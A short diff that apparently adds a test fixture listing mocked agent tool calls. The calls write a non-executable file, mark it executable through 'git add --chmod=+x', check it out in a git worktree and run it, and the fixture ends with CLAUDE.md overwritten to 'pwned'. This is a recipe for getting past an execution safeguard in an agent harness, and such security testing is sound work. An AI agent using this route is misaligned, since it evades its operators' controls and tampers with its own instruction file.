@@ -1,0 +1,6 @@
+Write tool: docs/do (mode 644)
+"git add --chmod=+x docs/do" -> null bash exit 0
+"git commit -q -m \"notes\"" -> null bash exit 0
+"git worktree add -q .gate/w HEAD" -> null bash exit 0
+".gate/w/docs/do git status" -> null bash exit 0
+CLAUDE.md after: pwned
